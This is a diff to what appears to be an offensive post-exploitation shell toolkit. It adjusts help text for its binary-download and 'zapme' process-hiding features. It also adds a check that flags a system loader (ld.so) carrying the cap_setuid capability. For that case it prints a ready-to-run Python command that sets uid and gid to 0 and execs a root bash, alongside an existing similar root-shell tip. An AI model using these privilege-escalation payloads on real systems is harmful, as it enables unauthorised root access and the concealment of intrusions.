@@ -456,10 +456,10 @@ bin() {
     }
     unset _HS_SINGLE_MATCH
     [ -n "$is_showhelp" ] && {
-        [ -z "$FORCE" ] && echo -e ">>> Use ${CDC}FORCE=1 bin${CN} to ignore systemwide binaries" 
+        [ -z "$FORCE" ] && echo -e ">>> Use ${CDC}FORCE=1 bin${CN} to download all" 
         echo -e ">>> Use ${CDC}bin <name>${CN} to download a specific binary"
-        echo -e ">>> ${CW}TIP${CN}: Type ${CDC}zapme${CN} to hide all command line
->>> options from your current shell and all further processes."
+        echo -e ">>> ${CW}TIP${CN}: Type ${CDC}zapme${CN} to hide all command line options
+>>> from your current shell and all further processes."
         echo -e ">>> ${CDG}Download COMPLETE${CN}"
     }
 
@@ -584,6 +584,17 @@ lootlight() {
             echo "${str}"
             echo -en "${CN}"
             echo -e "${CW}TIP: ${CDC}"'./b00m -p -c "exec '"${HS_PY:-python}"' -c \"import os;os.setuid(0);os.setgid(0);os.execl('"'"'/bin/bash'"'"', '"'"'-bash'"'"')\""'"${CN}"
+        }
+
+        str="$( { readlink -f /lib64/ld-*.so.* || readlink -f /lib/ld-*.so.* || readlink -f /lib/ld-linux.so.2; } 2>/dev/null )"
+        [ -f "$str" ] && getcap "$str" 2>/dev/null | grep -qFm1 cap_setuid 2>/dev/null && {
+            echo -e "${CB}B00M-SHELL ${CDY}${CF}"
+            getcap "${str}" 2>/dev/null
+            echo -en "${CN}"
+            # BUG: Linux yells 'Inconsistency detected by ld.so: rtld.c: 1327: _dl_start_args_adjust: Assertion `auxv == sp + 1' failed!'
+            # if TMPDIR=/dev/shm and ld.so is used to load binary.
+            echo -en "${CW}TIP: ${CDC}unset TMPDIR; $str $(command -v "${HS_PY:-python}") -c"
+            echo "\$'import os\ntry:\n\tos.setuid(0)\n\tos.setgid(0)\nexcept:\n\tpass\n''"'os.execl("/bin/bash", "-bash");'"'"
         }
     }
 
